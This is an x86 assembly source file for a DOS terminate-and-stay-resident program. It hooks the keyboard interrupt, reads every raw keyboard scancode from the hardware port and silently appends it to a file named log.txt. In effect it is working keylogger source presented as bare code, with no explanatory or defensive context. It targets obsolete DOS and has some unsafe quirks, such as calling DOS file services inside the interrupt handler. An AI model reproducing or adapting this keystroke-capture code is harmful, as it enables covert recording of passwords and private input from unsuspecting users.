DOSSEG
.model TINY
.data
	OLD_INT		dd ?
	filename 	db "log.txt",0
	handle		dw ?
	scancode	db "ABCDE"
.code
org 100h

stack 300h		;set the stack to a predetermined place

main proc
	jmp TSR
main endp

my_handler proc
	push cs		;set data segment to cs
	pop ds

	push ax
	push bx
	push cx
	push dx
	push sp
	push bp
	push es
	push si
	push di

	in al, 60h          ;read keyscan code from keyboard IO port
	mov [scancode], al  ;save the scanc code to be used later
	call openFile
	call writeAl
	call closeFile

	pop di
	pop si
	pop es
	pop bp
	pop sp
	pop dx
	pop cx
	pop bx
	pop ax

	jmp cs:OLD_INT
	iret
my_handler endp

closeFile proc
	mov ah, 3eh
	mov bx, [handle]
	int 21h
	ret
closeFile endp

writeAl proc
	;seek to the end of the file to append
	mov bx, [handle]
	mov ah, 42h     ;lseek
	mov al, 2h 	;end of file
	xor cx, cx	;0 bytes msw offset
	xor dx, dx      ;0 bytes lsw offset
	int 21h

	; write the byte
	mov ah,40h
	mov bx, [handle]
	mov cx,1h
	lea dx, scancode
	int 21h
	ret
WriteAL endp

openFile proc
	push ax
	push bx
	push cx
	push dx
  _open:
	;open file
	mov ah, 3dh
	mov al, 1h  	;write mode
	lea dx, filename
	int 21h
	jc short _create
	mov [handle], ax
	jmp short _opened

  _create:
	;create file
	mov ah,3ch      ;write dos file
	mov cx, 0	;attributes
	lea dx, filename
	int 21h
	jmp short _open

  _opened:
	pop dx
	pop cx
	pop bx
	pop ax

	ret
openFile endp

TSR:
	cli	;we are setting up interrupts so stop interupting please

	push cs	;quick way to point DS to CD
	pop ds

	;save old keyboard handler pointer
	;we will call that as soon as we have execute our hook
	mov al, 09h
	mov ah, 35h
	int 21h
	mov WORD PTR [OLD_INT], bx	;save instruction pojnter
	mov WORD PTR [OLD_INT+2], es	;save the code segment

	;install my keyboard hook
	lea dx, my_handler
	mov al, 9h
	mov ah, 25h
	int 21h

	;making program tsr and call tsr code
	mov al, 1h
	mov ah, 31h
	mov dx, 040h     ;64 pages (1KB) is enough of memory
	sti		 ;first enable interrupts again before going TSR
	int 21h
end main